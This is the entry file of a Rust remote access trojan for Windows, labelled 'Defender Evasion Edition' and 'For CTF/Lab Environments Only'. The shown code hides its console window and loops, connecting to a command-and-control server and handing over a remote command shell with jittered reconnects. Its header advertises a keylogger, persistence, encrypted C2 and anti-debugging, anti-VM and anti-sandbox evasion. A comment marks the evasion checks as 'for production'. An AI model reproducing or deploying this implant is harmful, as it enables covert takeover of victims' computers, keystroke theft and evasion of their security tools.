//! Hardened RAT Implant — Windows Defender Evasion Edition
//!
//! For CTF/Lab Environments Only.
//!
//! Features:
//! - Compile-time string obfuscation (XOR macro)
//! - Dynamic API resolution (GetProcAddress at runtime)
//! - RC4 + AES-128-CTR hybrid encrypted C2 communications
//! - Anti-debugging (IsDebuggerPresent, NtQueryInformationProcess)
//! - Anti-VM (registry fingerprinting, timing attacks)
//! - Anti-sandbox (uptime, sleep acceleration detection)
//! - Thread-safe keylogger with encrypted buffer
//! - Registry persistence via dynamically resolved APIs
//! - Configurable beacon interval with jitter

#[cfg(target_os = "windows")]
mod anti_analysis;
#[cfg(target_os = "windows")]
mod config;
#[cfg(target_os = "windows")]
mod dynapi;
#[cfg(target_os = "windows")]
mod keylogger;
#[cfg(target_os = "windows")]
mod network;
#[cfg(target_os = "windows")]
mod persistence;
#[cfg(target_os = "windows")]
mod shell;

// ============================================================================
// Windows entry point
// ============================================================================

#[cfg(target_os = "windows")]
fn main() {
    use config::Config;

    // Anti-analysis checks (uncomment for production, comment for testing)
    // if anti_analysis::perform_all_checks() {
    //     std::process::exit(0);
    // }

    // Hide console window
    unsafe {
        use windows_sys::Win32::System::Console::GetConsoleWindow;
        use windows_sys::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
        let hwnd = GetConsoleWindow();
        if hwnd != 0 {
            ShowWindow(hwnd, SW_HIDE);
        }
    }

    let cfg = Config::default();

    // Main beacon loop
    loop {
        if let Ok(stream) = network::connect_to_c2(&cfg) {
            shell::command_shell(stream, &cfg);
        }

        if !cfg.running() {
            break;
        }

        // Jittered sleep before reconnect
        let delay = cfg.jittered_delay();
        std::thread::sleep(std::time::Duration::from_millis(delay as u64));
    }
}

// ============================================================================
// Non-Windows stub — allows `cargo check` on macOS / Linux
// ============================================================================

#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!("[!] This implant only runs on Windows.");
    eprintln!("    Build with: cargo build --target x86_64-pc-windows-gnu");
    std::process::exit(1);
}
